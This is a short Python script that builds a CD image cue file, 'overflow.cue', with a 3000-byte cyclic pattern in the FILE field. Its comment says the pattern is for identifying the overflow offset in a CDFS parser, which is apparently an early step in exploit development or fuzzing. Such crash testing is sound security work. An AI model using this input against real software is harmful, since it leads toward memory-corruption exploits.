#!/usr/bin/env python3
import struct

# Create pattern with different letters at different positions
# so we can identify the offset
pattern = b""
chars = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
for i in range(3000):
    pattern += bytes([chars[i % len(chars)]])

with open("formats/cdfs/overflow.cue", "wb") as f:
    f.write(b'FILE "')
    f.write(pattern)
    f.write(b'" BINARY\n')
    f.write(b'TRACK 01 MODE1/2352\n')
    f.write(b'  INDEX 01 00:00:00\n')
